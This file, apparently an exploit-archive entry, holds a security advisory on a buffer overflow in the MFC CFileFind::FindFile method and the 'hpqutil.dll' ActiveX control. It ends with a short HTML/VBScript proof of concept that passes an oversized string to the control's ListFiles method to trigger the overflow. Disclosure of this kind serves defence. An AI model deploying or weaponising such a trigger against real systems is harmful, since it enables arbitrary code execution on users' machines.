@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/25697/info
+
+The CFileFind::FindFile method in the MFC library for Microsoft Windows is prone to a buffer-overflow vulnerability because the method fails to perform adequate boundary checks of user-supplied input.
+
+Successfully exploiting this issue may allow attackers to execute arbitrary code in the context of applications that use the vulnerable method.
+
+The MFC library included with Microsoft Windows XP SP2 is affected; other versions may also be affected.
+
+This issue also occurs in the 'hpqutil.dll' ActiveX control identified by CLSID: F3F381A3-4795-41FF-8190-7AA2A8102F85. 
+
+<object classid='clsid:F3F381A3-4795-41FF-8190-7AA2A8102F85' id='pAF'>
+</object>
+<input type="button" value="heap" language="VBScript" OnClick="OuCh()">
+<script language="VBScript">
+sub OuCh()
+Var_0 = String(620, "A")
+pAF.ListFiles Var_0
+End Sub
+</script>
